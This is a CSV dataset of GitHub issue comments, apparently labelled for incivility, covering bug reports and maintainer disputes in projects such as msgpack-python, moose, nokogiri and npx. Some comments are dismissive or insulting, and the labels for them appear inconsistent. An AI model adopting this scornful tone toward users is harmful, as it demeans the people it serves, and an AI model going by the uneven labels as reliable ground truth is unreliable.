minetest/minetest/1931/51396596,Leads to the following increases ,False,True,False,minetest/minetest/1931
minecraft-bugs/tryashtar/864/339511947,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Aug 8, 2014 bq. OpenGL AMD Radeon HD 7660G GL version 4.4.12874 Compatibility Profile Context 14.100.0.0, ATI Technologies Inc. You don't know what driver version you had prior to this ? ",False,True,False,minecraft-bugs/tryashtar/864
mojo/kraih/1236/340189202, Mojolicious version 7.87 Perl version v5.26.1 Operating system ubuntu  Steps to reproduce the behavior perl -MMojoFile -le 'MojoFile-&gt;new(q(a.txt))-&gt;spurt(qq(\x{100}))' Expected behavior a.txt written with 2 bytes c4 80 Actual behavior get error Wide character in syswrite at /home/dk/perl5/perlbrew/perls/perl-5.26.1/lib/5.26.1/x86_64-linux/IO/Handle.pm line 483. a.txt is zero bytes ,False,True,False,mojo/kraih/1236
modmail/kyb3r/49/339655342,"This is a terrible modmail. I don't know how to check the mail, everything is hard to setup. The bot goes offline randomly, the game status always disappear, it doesn't even respond and it is too complicated to setup. Do not ever use this bot to mod mail, trust me. This is terrible and the owner never answers ticket because he did no shit to help and not a great developer. Don't get this, trust me. You will have a hard time and I know how to setup bots. But this crappy bot is terrible. ",True,True,False,modmail/kyb3r/49
minecraft-bugs/tryashtar/864/339512155,"&lt;img src="" width=20 height=20&gt; [Mod] Kumasasa • Aug 8, 2014 Ok thanks. That was Catalyst 12.something. ",False,True,False,minecraft-bugs/tryashtar/864
minetest/minetest/1931/66295581,commit c5f6f9f77ac1df4b223649fcaca9a66333aa8786 ,False,True,False,minetest/minetest/1931
minecraft-bugs/tryashtar/864/339511949,"&lt;img src="" width=20 height=20&gt; Starwarswii • Aug 8, 2014 (at)Kumasasa Looking at previous crash reports, I think it might be version 4.2.11476 ",False,True,False,minecraft-bugs/tryashtar/864
mojo/kraih/1236/404129409,,False,True,False,mojo/kraih/1236
mojo/kraih/1236/404129197,Doesn't seem like bytes to me ,False,True,False,mojo/kraih/1236
mojo/kraih/1236/404127826,"MojoFilespurt is documented to take bytes, but  is a character. Encode it to your favourite encoding first. ",False,True,False,mojo/kraih/1236
mojo/kraih/1236/404133396,"Yes, write all bytes from the scalar. ",False,True,False,mojo/kraih/1236
mojo/kraih/1236/404133702,"Wow, just ""closed the issue"" as a non-issue? That's mature D ",True,True,False,mojo/kraih/1236
mojo/kraih/1236/404135563,The answer @friend gave was 100% correct. So this is not a bug. If you require additional help please use our official support channels. ,False,True,False,mojo/kraih/1236
mojo/kraih/1236/404168986,"I don't see this discussion end constructively, therefore i'm locking this issue. ",False,True,False,mojo/kraih/1236
mojo/kraih/1236/404162820,"Well it might be correct, but the documentation ""Write all data at once to the file"" doesn't say anything about the byte/character distinction, and $bytes can be understood as whatever bytes are there in the scalar, which I would expect. So that's at least a case to either fix the documentation or the attitude. ",False,True,False,mojo/kraih/1236
monassis-ticket-test/monassis-server/111/10193487,@friend The live Monassis server could not be pinged. Received the following message 'Connection refused' ,False,True,False,monassis-ticket-test/monassis-server/111
mongoose/LearnBoost/1177/7945852,"Hello, I'm using mongoose 3.3.1 + express 3.0. When attempting to perform a document update it seems  query is not committed  when a redirect is used in a callback. Do you know of a solution to this problem? // model // var UserStatus = new Schema({     user mongoose.Schema.Types.ObjectId,     displayName String,     client_id String,     status String,     currentlyWorkingOn String,     ts {type Date, default Date.now} }); module.exports.UserStatus = mongoose.model('UserStatus', UserStatus); // controller // module.exports.receive_user_status = function(req, res){     var user_id = req.session.passport.user._id;     var current_status = req.body.user.current_status; models.UserStatus.findOneAndUpdate({user user_id}, {$set {currentlyWorkingOn current_status}}, {safe true}, function (err, numberAffected, raw) {     if (err){         console.log(err);         res.status(500).send();         return;     }else{         console.log('The number of updated documents was %d', numberAffected);         console.log('The raw response from Mongo was ', raw);         res.redirect('/');     } });  }; If I simply comment out res.redirect('/'); in the callback the query is committed, however, with the redirect the row is not updated. Is there something I'm missing? I'm a total n00b at this, so thanks again for bearing with me. Thanks, C ",False,True,False,mongoose/LearnBoost/1177
monocular/helm/398/276533821,"Found this small typo while trying to deploy monocular with helm and did not know why I still received a warning regarding releases being enabled. Of course, this was due to copy-pasting the command. ",False,True,False,monocular/helm/398
moose/idaholab/12263/427479711,@friend is wrong ,False,True,False,moose/idaholab/12263
moose/idaholab/12263/427479529,"Guys - please don't start something different from Chigger.  Chigger can already do most of this.  To me this sounds like a new use of Chigger - or possibly just feature extensions of Chigger. We've already spent too much time and effort doing Chigger to start something different. Derek On Fri, Oct 5, 2018 at 207 PM Daniel Schwen notifications@friend.com wrote ",False,True,False,moose/idaholab/12263
moose/idaholab/12263/427479832,@friend I told you this reply would be triggered -D ,False,True,False,moose/idaholab/12263
moose/idaholab/12263/367332842,"Rationale Per discussion with @friend we'd like to make an attempt to get this into MOOSE. The proposed tool will accept HIT files with a description of data sources (e.g. CSV file columns), data preprocessors (e.g. Difference and Unit conversion), and outputs (e.g. matplotlib line plots) to simplify the batch generation of plots for example for assessment cases that run automatically. Description A python tool using the moose python factory system will be developed to simplify the generation of large sets of plots. Impact Added capability ",False,True,False,moose/idaholab/12263
moose/idaholab/12263/427481458,"What are you talking about?  Have you even used the Postprocessor or Vectorpostprocessor tabs in Peacock?  You do know those are rendered by Chigger... right?  You can even save out the .py file and run them in batch mode to regenerate the plots. On Fri, Oct 5, 2018 at 253 PM Daniel Schwen notifications@friend.com wrote ",False,True,False,moose/idaholab/12263
moose/idaholab/12263/427480725,"You must have missed the part where I wrote And you may not be aware of @friend 's position not to develop Chigger in this direction. Also we need vector plots. That'd be a bit of a stretch for Chigger, given that it is VTK based. ",False,True,False,moose/idaholab/12263
moose/idaholab/12263/427484316,"That's great, but a separate .py file for each assessment case is exactly what we're trying to replace here. ",False,True,False,moose/idaholab/12263
moose/idaholab/12263/427480260,Well... if you knew it was going to go down this way... why post it like this? Don't underestimate the amount of time necessary to make something like this work well.  We really need to stay focused on Chigger and pool our resources (mostly our person-power) to make one really great scriptable plotting tool. ,False,True,False,moose/idaholab/12263
moose/idaholab/12263/427485113,"What do you mean?  They .py file just says what columns to plot, what to label the axes, etc.  You gotta put that somewhere. ",False,True,False,moose/idaholab/12263
moose/idaholab/12263/427485257,Ok - I'm calling it.  Let's not discuss this anymore until I get back.  This will go better in person with @friend and @friend . ,False,True,False,moose/idaholab/12263
moose/idaholab/12263/427486554,"Yeah, an input file. Lots of data already is in the outputs. We'll be using Chigger for various tasks here anyways. For reading global values form exodus files for example. If requested we can even use it as one of the output plugins to generate plots. ",False,True,False,moose/idaholab/12263
moose/idaholab/12263/427487017,It might help if I post an example input for the current work in progress version ,False,True,False,moose/idaholab/12263
moose/idaholab/12791/404882134,"Rationale There is no state in steady state problem, only initial guess, etc. Calling  is just wrong. Description Whatever thing preventing us from removing this call should be fixed. Impact More robust code. ",False,True,False,moose/idaholab/12791
moose/idaholab/12263/427953911,"FYI. The VPP/PP plotting in Peacock uses matplotlib, not chigger. ",False,True,False,moose/idaholab/12263
moose/idaholab/12263/427488551,"I locked this for a reason (this isn't the best way to have this discussion).  You are now on a 24 hour cooldown from the ""MOOSE Developer"" team.  We'll talk about this idea next week. ",False,True,False,moose/idaholab/12263
moose/idaholab/12791/459042979,"FYI, impact to framework tests after removing it No impact to modules. ",False,True,False,moose/idaholab/12791
moose/idaholab/12791/459062812,No impact to applications. ,False,True,False,moose/idaholab/12791
msgpack-python/msgpack/305/401706913,It's for compatibility with JSON library. And I teach you about strict_keys option.  Why don't you try it before reply? I'm not free tech support. ,False,True,False,msgpack-python/msgpack/305
msgpack-python/msgpack/305/337409477,"I understand that  has a single array-type, that both  and  both get mapped to (and that this is the reason for the -kwarg). However, the  distinction is essential in Python, and one can't fully emulate the other (e.g.  is hashable,  isn't;  has an -method,  doesn't). For this reason, I need to reconstruct tuples and lists correctly, e.g.  -- actually, arbitrary nestings of . Currently (v0.5.6), this does not work So now to the actual question - I thought I could use the  keywords to help me out, but this does not work for , even though it does work for sets (and all the other types covered by ). ",False,True,False,msgpack-python/msgpack/305
msgpack-python/msgpack/305/401706115,"I understand that it's cross-language, but it's not clear to me why  don't seem to process  - then I can deal with it myself. Also, it's not clear to me what the difference is between using these encode/decode hooks and an ExtType... ",False,True,False,msgpack-python/msgpack/305
msgpack-python/msgpack/305/401710780,"So you must ask question on Stackoverflow. Posting question on here means you send spam notification to me. README is very short entry point for new users, not full document.  You must read docstring and  bad English writer, contribution on document is welcome. I respond already.  It's compatibility with JSON and strict_types allows you to use . ""object"" in  is JSON's object, you must understand it if you read JSON API document. You must use your time before respond so quickly. Or you should use Stackoverflow to get reply from kind volunteer for you.  I'm not. ",False,True,False,msgpack-python/msgpack/305
msgpack-python/msgpack/305/401705283,"Like JSON, it's not goal of msgpack. You can use strict_types option to distinguish tuple and list when packing, and pack them to custom ExtType.  Then you can unpack ExtType manually. I won't add any more features for Python-only usages. msgpack is cross-language, portable format. ",False,True,False,msgpack-python/msgpack/305
msgpack-python/msgpack/305/401708961,"I'm on it. No need to be like that. I've been trying to read up all the documentation I could find, but  has only examples, and  does not mention  or explain the  concept in depth (which codes are available/reserved? Restrictions? Nesting?). I started with the encode/decode because that's how pandas does it too. The barrier for ExtType was a fair bit higher without much documentation, but I'll try it now. Finally, you haven't responded either why the  kwargs work for so many types, but not for ... ",False,True,False,msgpack-python/msgpack/305
msgpack-python/msgpack/305/401717734,"May I suggest to put this link into ? I couldn't find the API documentation before, and it's not like I didn't try. It's only for v.0.4 instead of 0.5.6, but it's already more detailed than . To the contrary, it does not appear like participation/contribution is welcome. However, to document the solution of my problem if someone else encounters it as well -- setting  was enough (and adapting the code a little because  does not work for ). No extension types are necessary, although I understand now that these are independent of the encoding/deconding, but would help to save some bytes. ",False,True,False,msgpack-python/msgpack/305
msgpack-python/msgpack/305/401723647,"&lt;img width=""403"" alt=""2018-07-02 17 57 04"" src="" ""0.4"" is a bug.  It's document for latest version. Because it seems you didn't use your time enough to read code, past issues, etc. Only contributors who can survey themselves can contribute. If I need to teach everything, it's not contribution.  It just bothering me. ",True,True,False,msgpack-python/msgpack/305
nav/UNINETT/142/276003193,Translated changeset references  1f6537ea0f89889b89ebcdf54c12fa930ebfb1de ,False,True,False,nav/UNINETT/142
nav/UNINETT/142/276003177,Translated changeset references  af565bebac1a9f2893395f63a27249c6fe809652 ,False,True,False,nav/UNINETT/142
nav/UNINETT/142/201249182,"If a NAV user has changed the 'cisco' vendor id into 'Cisco' (with an uppercase C), PortAdmin will no longer show any VLAN information for Cisco switches.  The same thing would happen if the vendor id is changed to anything else, and will happen for types that have been attached to the wrong vendor id by the user. This apparently happens because PortAdmin performs a case-sensitive match against the netbox' vendor id to select which set of SNMP queries to run against it. PortAdmin should instead extract the vendor's enteprise ID from the device's sysObjectID.  This is an integer value, read by SNMP, and cannot be changed by the user, so it will always be correct.  Cisco's enterprise ID is '9', see  for a complete list.  Imported from Launchpad using lp2gh.  date created 2011-03-17T144810Z owner mbrekkevold assignee ntnu-nav the launchpad url was ",False,True,False,nav/UNINETT/142
netmiko/ktbyers/1074/456180348,@friend Why not just call the .enable() method prior to calling the .config_mode() method? ,False,True,False,netmiko/ktbyers/1074
netmiko/ktbyers/1074/456263391,"@friend  that looks more modular, you can update the code with the suggested solution. Im ok with it. ",False,True,False,netmiko/ktbyers/1074
netmiko/ktbyers/1074/401316896,"Exception while executing configure terminal related commands for mellanox switch. when enabled the debug logs, found that the command to enter the ""config terminal"" of mellanox switch is partial and requires additional command to enter the ""config terminal"". correct sequence of command after successful ssh to mellanox switch is 1&gt; enable 2&gt; configure terminal thus, the small change in ""mellanox_ssh.py"" code is required as below (#change required 1 and #change required 2) def config_mode(self, config_command='config term', pattern='#')            #change required 1       enter_enable = 'enable'     """"""Enter into config_mode.""""""     output = ''     if not self.check_config_mode()        #change required 2         self.write_channel(self.normalize_cmd(enter_enable))         self.write_channel(self.normalize_cmd(config_command))         output = self.read_until_pattern(pattern=pattern)         if not self.check_config_mode()             raise ValueError(""Failed to enter configuration mode."")     return output  With this change the configure terminal relates command gets executed successfully. added the debug logs for ssh test to mellanox switch  before and after code change. After_code_change.log Error_without_code_change.log ",False,True,False,netmiko/ktbyers/1074
new-website/cdnjs/216/303714303,"Your dependency file specified a branch or reference for public/git_stats/atom-extension, but Dependabot couldn't find it at the project's source. Has it been removed? You can mention @friend in the comments below to contact the Dependabot team. ",False,True,False,new-website/cdnjs/216
netmiko/ktbyers/1074/464265436,You would need to do this in your Python code. Netmiko assumes you are in enable mode when you execute the config_mode() method (so you would have to manually call .enable() if that is not the case). ,False,True,False,netmiko/ktbyers/1074
node-re2/uhop/49/498528783,"With NaN changing almost every release I am seriously entertaining an option of using N-API instead. NaN should be updated to the latest version, but it is likely to have some API changes as well. I'll look into that later this week. If the update is too big, I'll try to switch to N-API. ",False,True,False,node-re2/uhop/49
ngx-customscrollbar/q2g/58/427946735,"This PR contains the following updates   Package Type Update Change References     @&#8203;types/node devDependencies minor  -&gt;  source     Renovate configuration date Schedule ""before 10am"" in timezone Europe/Berlin. vertical_traffic_light Automerge Disabled by config. Please merge this manually once you are satisfied. recycle Rebasing Whenever PR becomes conflicted, or if you modify the PR title to begin with """". no_bell Ignore Close this PR and you won't be reminded about this update again.   [ ] If you want to rebase/retry this PR, check this box   This PR has been generated by Renovate Bot. View repository job log here. ",False,True,False,ngx-customscrollbar/q2g/58
node-re2/uhop/49/451470882,"Hej there 👋 With Node 12 V8 versions changed and the C bindings this library use partially do not seem to exist anymore (or more likely exist somewhere else) &lt;details&gt;&lt;summary&gt;Build errors log&lt;/summary&gt; &lt;p&gt;   &lt;/p&gt; &lt;/details&gt;I saw #18, but given my limited C++ skills this is a bit out-of-scope for me right now. If you have some remarks on where to fix the Node 12 compatibility in the current codebase, I'd be up taking a stab on a PR. Thank you for this library! ",False,True,False,node-re2/uhop/49
node-re2/uhop/49/498569440,"I did try with  (which is the most recent version at time of writing) which did yield the errors above. In case you opt for the N-API rewrite I'd be grateful if we could chat and see where I might be of use, so you don't have to tackle the whole thing alone 🙂 Kinda curious to explore more in this area ",False,True,False,node-re2/uhop/49
ngeo/camptocamp/3617/302371897,"☝️ Greenkeeper’s updated Terms of Service will come into effect on April 6th, 2018. Version 0.9.9 of googshift was just published. &lt;table&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Dependency     &lt;/td&gt;     &lt;td&gt;       googshift     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Current Version     &lt;/td&gt;     &lt;td&gt;       0.9.8     &lt;/td&gt;   &lt;/tr&gt;   &lt;tr&gt;     &lt;th align=left&gt;       Type     &lt;/td&gt;     &lt;td&gt;       devDependency     &lt;/td&gt;   &lt;/tr&gt; &lt;/table&gt;The version 0.9.9 is not covered by your current version range. If you don’t accept this pull request, your project will work just like it did before. However, you might be missing out on a bunch of new features, fixes and/or performance improvements from the dependency update. It might be worth looking into these changes and trying to get this project onto the latest version of googshift. If you have a solid test suite and good coverage, a passing build is a strong indicator that you can take advantage of these changes directly by merging the proposed change into your project. If the build fails or you don’t have such unconditional trust in your tests, this branch is a great starting point for you to work on the update.  &lt;details&gt; &lt;summary&gt;Commits&lt;/summary&gt; &lt;p&gt;The new version differs by 2 commits.&lt;/p&gt; &lt;ul&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Bump version&lt;/code&gt;&lt;/li&gt; &lt;li&gt;&lt;a href="" &lt;code&gt;Fix double addition of '.js' suffix&lt;/code&gt;&lt;/li&gt; &lt;/ul&gt; &lt;p&gt;See the &lt;a href="" diff&lt;/a&gt;&lt;/p&gt; &lt;/details&gt;&lt;details&gt;   &lt;summary&gt;FAQ and help&lt;/summary&gt;    There is a collection of [frequently asked questions]( If those don’t help, you can always [ask the humans behind Greenkeeper]( Greenkeeper bot palm_tree ",False,True,False,ngeo/camptocamp/3617
node-re2/uhop/49/498975632,"Damn. The  part is less crucial, as Node 6 went EOL on April 30th - but Node 8 is in LTS maintenance until end of year 😢 The v1.9.0 would make some people getting this version on Node 8 (minor version bump) - to be on the safe side would it make sense cutting a major version and marking 1.9 as deprecated so that people do not auto-upgrade to a broken version? ",False,True,False,node-re2/uhop/49
node-re2/uhop/49/499278593,I added back support for Node 6-12. ,False,True,False,node-re2/uhop/49
node-re2/uhop/49/498912978,"I fixed it but now it is broken on older versions of Node &lt;= 8. Oh, well. I will release the new version soon. ",False,True,False,node-re2/uhop/49
nokogiri/sparklemotion/1709/286791320,If you're having trouble installing Nokogiri ... Have you tried following [the installation tutorial][tutorial]? yes What is the output of ? What are the contents of the  file? Didnt get so far What operating system are you using? Windows 10 x64 ,False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/357411525,"Same here, and I really would like it if downgrading is not my only option ",False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/357632186,Windows 7 x64 same error msg. ,False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/357495804,I am currently having the same issue ,False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/358909080,Any word on support for 2.5.0 on OS X? ,False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/358927731,@friend OSX should use the normal gems that also work on *nix. I had no problems with rbenv to install nokogiri on OSX. ,False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/359783631,I am wondering how this happens. Its kind of a tradition ruby makes a point release around christmas every year. the dev version was around for weeks. Ignoring Windows blames the users who are bound to this OS for what ever reason ,False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/357677494,"The fix is already merged, although a new release is pending. See   then, it's better to stick with Ruby 2.4.2 on Windows. The Nokogiri team removed the GEMSPEC from sources, to disallow people building from master branch, since it is unstable and probably would contain bugs. You can read more about it here ",False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/360836510,Windows Ruby 2.5 build is up and running ,False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/360782174,"Remaining work to be done on our CI pipeline at  ] upgrade concourse to 3.8.0 [ ] test Ruby 2.5 support just added to windows-ruby-dev-tools-release and cut a release [ ] add a Ruby 2.5 test job to the pipeline [ ] cut a Nokogiri release that adds Ruby 2.5  This is probably a good time to remind watchers that Ruby 2.2 is approaching EOL on  2018-03-31, and so the first release after that will likely remove Ruby 2.2 binaries from the fat gem. ",False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/361064638,Note that commit bf94cf5 was added to master to make windows tests less brittle. ,False,True,False,nokogiri/sparklemotion/1709
nokogiri/sparklemotion/1709/359829700,"@friend nokogiri-core is always welcoming of contributors who would like to help us support Windows. We've asked for help repeatedly over the years, as we've all got jobs that distract us from supporting open source software, despite our best efforts and intentions. I'd like to ask that you pay attention to the tone of your message above. ""Ignoring Windows"" is clearly an untrue statement, given the number of hours I've personally spent, the number of hours @friend has spent, the amount of time we've spent providing automated testing tooling for Nokogiri on Windows, etc., etc. Windows support in Nokogiri is first class. We provide precompiled DLLs for users who want a fast, simple installation; and we provide support for users who want to compile Nokogiri and libxml using DevKit. Saying that we're ignoring Windows users is absurd and a little insulting. Currently I'm blocking a release that supports Ruby 2.5 on windows on getting Ruby 2.5 supported in our test pipelines. I accept some fault for not being more transparent about this as the blocking factor. But now I'm trying to make amends by communicating exactly what's going on behind the scenes to properly support you and the platform that you use. Not ignoring you or blaming you, as you claim. I'm going to lock this issue because I really don't want to do a whole back-and-forth. We'll release support for Ruby 2.5 on Windows as soon as we can, just as we always do, and we appreciate your patience and empathy as we work. ",False,True,False,nokogiri/sparklemotion/1709
normalizr/paularmstrong/358/428501663,"Can you also explain me why there's a new version on npm and no tag/release on github? &lt;img width=""527"" alt=""image"" src=""",False,True,False,normalizr/paularmstrong/358
nokogiri/sparklemotion/1709/361243041,"Nokogiri 1.8.2 has shipped with Ruby 2.5 support in the ""fat binary"" windows gems. Thanks everyone for your patience. ",False,True,False,nokogiri/sparklemotion/1709
normalizr/paularmstrong/358/368569270,"Hello, Could you update the releases page as much as you do for CHANGELOG.md? I usually go to the releases page to see if there's any change of the API. ",False,True,False,normalizr/paularmstrong/358
normalizr/paularmstrong/358/428584680,There's a lot of manual process involved. Please forgive me for being strapped for time. ,False,True,False,normalizr/paularmstrong/358
np/sindresorhus/185/262955100,"This is the easiest possible solution for #184. It uses the  option for  which is documented here. Ideally, the execution of the publish task would pause if  prompted for a one-time password allowing it to be read from , but I couldn't figure out how to get that to work. As a reference, here's how npm is requesting the otp. I understand if it'd be worth it to wait for a more robust solution over merging something that might get deprecated soon. But I thought if there was enough requests for this feature that this would be a nice way to allow  and two-factor auth to work together. ",False,True,False,np/sindresorhus/185
normalizr/paularmstrong/358/428631045,Pushing tags requires a separate flag. Creating a release on GitHub is manual. Condescending comments like yours make it hard to want to continue supporting open source. ,False,True,False,normalizr/paularmstrong/358
np/sindresorhus/185/334312557,I forgot to add that the biggest drawback of doing it this way is that a one-time password could be invalid by the time a long running  command that does testing and installing of node_modules got to the publish step. ,False,True,False,np/sindresorhus/185
normalizr/paularmstrong/358/428590214,Don't know use ? It'll create a commit with a new version for  + a git tag. ,False,True,False,normalizr/paularmstrong/358
np/sindresorhus/185/342879432,"This is better than nothing, isn't it? Should be able to iterate later, but unblocking usage of 2fa with np right now would be awesome ",False,True,False,np/sindresorhus/185
np/sindresorhus/185/334705622,That's a pretty big drawback. Do you know how long the token is valid? ,False,True,False,np/sindresorhus/185
np/sindresorhus/185/343045713,Is it though? I rather have no feature than one that only works sometimes. What's implemented here is very time sensitive and it's just going to end up with lots of support requests when it doesn't work. Agreed. I want to be able to use 2FA too. A better workaround for now is to just . ,False,True,False,np/sindresorhus/185
np/sindresorhus/185/334820034,"I'm using Authy to generate my 2fa codes which says they ""expire"" every 30 seconds at which point you get a new code. I tested by having my test command be  and running  with various amount of time remaining before the code was said to expire. The actual expiration seemed to be about 50 seconds after the 30 second window (or 80 seconds from the start of the code). ",False,True,False,np/sindresorhus/185
npx/zkat/168/308395729,"In windows, it does not run a global js via/in node.js npx runs via Microsoft JScript runtime in windows, es5 To reproduce, run ES2016+, that would run on current node A) via npx B) via node full_path_to_global_js_yarn_or_npm. B runs fin. A gives JScript errors. If you want a package, try A and B w/  you test in windows even? There are so many reports on www of this issue. ",False,True,False,npx/zkat/168
npx/zkat/168/376013501,"Other than full path, the other way to run is to fix this registry setting, can be done in GUI  you can just run it as normal command line cli (w/o npx). ",False,True,False,npx/zkat/168
np/sindresorhus/185/343045811,"If anyone really wants this, consider helping out with ",False,True,False,np/sindresorhus/185
npx/zkat/168/384341081,"@friend One way to 'monkey patch' is node $Envuserprofile/WHERE-YOUR-INSTALLED/node_modules/nbake/nbake.js . Where nbake is your npm module. ( my project where I do that is here, WIP  ) ",False,True,False,npx/zkat/168
npx/zkat/168/384345932,"Oh I see.  I was hoping for a workaround that would let me use npx without errors on Windows, because npx has some quite cool features. ",False,True,False,npx/zkat/168
npx/zkat/168/384346490,"Same here. I don't see source for npx.cmd so I can fix it for them. Works fine on mac, linux, docker. Just Windows it does not work. ",False,True,False,npx/zkat/168
npx/zkat/168/386458476,"Closing this partially as a duplicate of  closing this because npx is tested on Windows. You can see the appveyor page, which runs the npx test suite on Windows. Specific bugs will be specific bugs, but there's certainly a test suite, and it's certainly running on Windows. Please file issues for specific bugs. ",False,True,False,npx/zkat/168
npx/zkat/168/385416214,"TotallyInformation I do think the fix is 'test on windows'. And also I think that npx is part of node now, so it is node org that has a blemish. Currently, I can't even find the source code for npx.cmd. What I did is identify the root cause, before my post all the reports on www said they could not ID the cause. ",False,True,False,npx/zkat/168
npx/zkat/168/386638093,Regarding ' npx is tested on Windows' - clearly the test are insufficient. We would like node org to address and have sufficient testing on windows. ,False,True,False,npx/zkat/168
npx/zkat/168/386664710,"@friend what the node org does is not my problem. I'm not involved with them, and I am not part of any of their teams. If you want their stuff to be tested better, go to their issue tracker. And if you find a missing test, I'll gladly take a PR. ",False,True,False,npx/zkat/168
npx/zkat/168/385389474,"Given that npx is now distributed with Node.JS, this is a VERY IMPORTANT thing to fix! I don't pretend to understand all of the technical details but please bear in mind that this - to users - is an npx error, not an npm error. That's because npm works just fine on Windows, npx does not. I am not trying to be negative. This is a great tool and I want to see it succeed. ",False,True,False,npx/zkat/168
npx/zkat/168/386714159,"@friend  node org ships npx, so the management at node is responsible for this, this is their problem. It appears that at least from node POV, you are reporting to them and they think of you as a part of their team (  ) . But it appears you are right, they are not monitoring neither you, nor their project. As I said in this bug #168, they should state that windows is not supported in the read me here, no need for me to do a pr. In the issue tracker you mention, we have a bug that you closed   I asked for the patch or commit that fixed it -  I suspect there are none? You said 'This should have been fixed ' , did you mean to say 'this has been open for a while, I should just close it'.  Node management should monitor their sr engineer, at least for ethics, like their monitor their projects.  It reflects on node, if they should be considered a stable enterprise level platform.  That is my takeaway from the two interactions I had with their sr engineer. ",False,True,False,npx/zkat/168
obs4MIPs-cmor-tables/PCMDI/59/244497613,"I suggest structuring the source_id listing in this table as follows ""source_id""{     ""REMSS-PRW-6-6-0""{         ""institution_id"" ""RSS"",         ""label""""REMSS PRW v6.6.0"",         ""label_extended""""REMSS PRW V6.6.0 (2017) Precipitable Water"",         ""release_year""""2017"",         ""source_id""""REMSS-PRW-6-6-0"",         ""source_label""""REMSS-PRW"",         ""source_type""""satellite_blended"",         ""region""""global""  }, but maybe this is asking too much of the user and CMOR.  Need to check with Denis.  ""label"" and ""release_year"" won't get used.  There are rules that govern the differences between source_id, source_label, and label_extended. If we collected this information before a dataset gotten written, then given a source_id, CMOR could automatically generate the following global attributes institution_id, institution, source_label, source, source_type, and region.  They wouldn't have to be set by the user in the obs4MIPs_input.json file.  [NEED TO CONFIRM THIS WITH DENIS!] We need to be sure that source_type and region are invariably implied by source_id (and can't have multiple values).  (If multiple values were allowed, then the file names would not necessarily be unique, I think ... well in the case of ""region"" I suppose the ""grid_label"" could differ.) ",False,True,False,obs4MIPs-cmor-tables/PCMDI/59
npx/zkat/168/386780938,"@friend  Yup, this is -their- problem, not mine. I'm still working to make npx work well. A bug is a bug, and I think your issue OP is overblown. node is not anywhere on my LinkedIn (which... it's a bit creepy for you to be looking up like that? just sayin'). I work for npm, Inc, which is a C Corporation that is 100% independent from the Node Foundation. We have a working relationship, but I am not, in any way, actually beholden to Node Core. I just try to cooperate with them as a separate person.  Read the thread. It's in the thread. The thread that you commented in.  I'm not even going to respond to this last paragraph, but I -will- lock this issue. I look forward to accepting a PR from you fixing the issues you're having, in the spirit of Open Source and good ethics. ",False,True,False,npx/zkat/168
office-js-docs-pr/OfficeDev/224/335687148,"So, to sum it up, Office Add-ins are unavailable for perpetually licensed copies of Office 2016 and earlier, and are unavailable for OneNote apps, regardless of the licensing scheme. But one item is missing OneNote UWP app.  Document Details ⚠ Do not edit this section. It is required for docs.microsoft.com ➟ GitHub issue linking.  ID f7c255e4-d0f9-5b35-bec0-fdd690bdeff1 Version Independent ID dae8b049-0f53-ea13-9998-cfb4362b7553 Content Office Add-in host and platform availability Content Source docs/overview/office-add-in-availability.md Product office GitHub Login @friend Microsoft Alias o365devx  ",False,True,False,office-js-docs-pr/OfficeDev/224
officer/davidgohel/141/336310576,doesn't work body_add_docx method ,False,True,False,officer/davidgohel/141
officer/davidgohel/141/400757830,"I can not reproduce. Please, follow the guidelines explained in the template of new issue. ",False,True,False,officer/davidgohel/141
officer/davidgohel/141/400863875,"Sorry, but your corrected code also doesn't work. I get empty final.docx. I use R version 3.4.4 (2018-03-15) Platform x86_64-pc-linux-gnu (64-bit) Running under Manjaro Linux other attached packages [1] magrittr_1.5  officer_0.3.1 officer package installed from cran ",False,True,False,officer/davidgohel/141
officer/davidgohel/141/400953258,"I asked you to explain ""does not work"". I won't ask a third time, I don't have time for that. ",True,True,False,officer/davidgohel/141
officer/davidgohel/141/400760682,"Example from documentation This just overwrite doc variable. In src parametr I can pass any string and I get the same result♠doc &lt;- body_add_docx(x = doc, src = ""external_file.docx"" )final_doc &lt;- read_docx()` I can delet and also will get the same result ",False,True,False,officer/davidgohel/141
officer/davidgohel/141/400993855,that is what I get final.docx You never provided what you get nor describe the error nor answer my questions. ,False,True,False,officer/davidgohel/141
oh-my-zsh/robbyrussell/4069/113664796,"What system are you on? Windows/cygwin? And when you say, ""git clone errors"", do you actually mean that the  operation is raising an error? Or that you are having trouble with the files in your cloned repo after the operation completes? ",False,True,False,oh-my-zsh/robbyrussell/4069
officer/davidgohel/141/401162077,"@friend Serge Nosov, you spent few minutes downvoting all my SO answers ) &lt;img width=""794"" alt=""capture d ecran 2018-06-28 a 21 57 12"" src="" you replied to yourself with a wrong answer! . &lt;img width=""689"" alt=""capture d ecran 2018-06-28 a 21 59 16"" src="" function you want to use is only working when the document is edited in Word. I am working with MacOS and have no issue when opening the document in Word. ",False,True,False,officer/davidgohel/141
officer/davidgohel/141/400820479,"OK, thanks, I will correct, it should be However, what is the issue with your first code? Could you please explain what does not work. Also please add . ",False,True,False,officer/davidgohel/141
oh-my-zsh/robbyrussell/4069/113824587,"@friend it's not considered solved. I implemented a solution but never got to posting it, sorry joy I'm submitting my PR now, please feel free to test it (I'll be posting test instructions as well soon) #4071. ",False,True,False,oh-my-zsh/robbyrussell/4069
oh-my-zsh/robbyrussell/4069/89607351,"This pertains to issues #1730 #3294, #3304 and perhaps others.  Cloning the repository fails if autocrlf=true.  A workaround is OK but I don't understand why the issue is considered resolved; autocrlf is a standard Git setting and users should be able to clone the repository successfully whichever setting they choose. ",False,True,False,oh-my-zsh/robbyrussell/4069
openDCIM/samilliken/1114/450151384,It's already user defined in the configuration screen. ,False,True,False,openDCIM/samilliken/1114
